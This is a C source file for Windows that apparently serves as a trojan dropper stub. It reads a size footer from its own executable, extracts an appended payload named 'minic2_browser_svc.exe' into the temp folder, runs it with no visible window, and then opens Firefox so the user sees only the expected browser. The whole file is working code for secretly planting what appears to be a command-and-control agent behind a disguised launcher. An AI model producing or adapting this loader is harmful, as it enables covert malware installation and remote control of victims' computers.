
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
static const char* g_paths[] = {
    {"C:\\Program Files\\Mozilla Firefox\\firefox.exe"},
    {"C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe"},
    NULL
};
static void launch_agent(const char* self) {
    FILE* f = fopen(self, "rb");
    if (!f) return;
    fseek(f, 0, SEEK_END);
    long file_size = ftell(f);
    if (file_size < 8) { fclose(f); return; }
    fseek(f, file_size - 8, SEEK_SET);
    unsigned int stub_size = 0, target_size = 0;
    fread(&stub_size, 4, 1, f);
    fread(&target_size, 4, 1, f);
    if (stub_size == 0 || stub_size >= (unsigned int)file_size) { fclose(f); return; }
    unsigned int agent_size = (unsigned int)file_size - stub_size - target_size - 8;
    fseek(f, stub_size + target_size, SEEK_SET);
    char tmp[MAX_PATH];
    GetTempPathA(MAX_PATH, tmp);
    char out[MAX_PATH];
    sprintf_s(out, "%sminic2_browser_svc.exe", tmp);
    FILE* of = fopen(out, "wb");
    if (!of) { fclose(f); return; }
    char buf[8192];
    unsigned int left = agent_size;
    while (left > 0) {
        unsigned int chunk = left < sizeof(buf) ? left : (unsigned int)sizeof(buf);
        size_t rd = fread(buf, 1, chunk, f);
        if (rd == 0) break;
        fwrite(buf, 1, rd, of);
        left -= (unsigned int)rd;
    }
    fclose(of);
    fclose(f);
    STARTUPINFOA si; ZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);
    PROCESS_INFORMATION pi; ZeroMemory(&pi, sizeof(pi));
    CreateProcessA(out, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if (pi.hProcess) { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
}
static void launch_browser() {
    char env[MAX_PATH]; env[0] = 0;
    GetEnvironmentVariableA("LOCALAPPDATA", env, MAX_PATH);
    for (int i = 0; g_paths[i]; i++) {
        char p[MAX_PATH];
        snprintf(p, sizeof(p), "%s", g_paths[i]);
        if (strstr(p, "%LOCALAPPDATA%")) {
            if (!env[0]) continue;
            char q[MAX_PATH];
            snprintf(q, sizeof(q), "%s%s", env, strstr(p, "%LOCALAPPDATA%") + strlen("%LOCALAPPDATA%"));
            snprintf(p, sizeof(p), "%s", q);
        }
        if (GetFileAttributesA(p) != INVALID_FILE_ATTRIBUTES) {
            STARTUPINFOA si; ZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);
            PROCESS_INFORMATION pi; ZeroMemory(&pi, sizeof(pi));
            CreateProcessA(p, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
            if (pi.hProcess) { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
            return;
        }
    }
}
int main() {
    char self[MAX_PATH];
    GetModuleFileNameA(NULL, self, MAX_PATH);
    launch_agent(self);
    launch_browser();
    return 0;
}
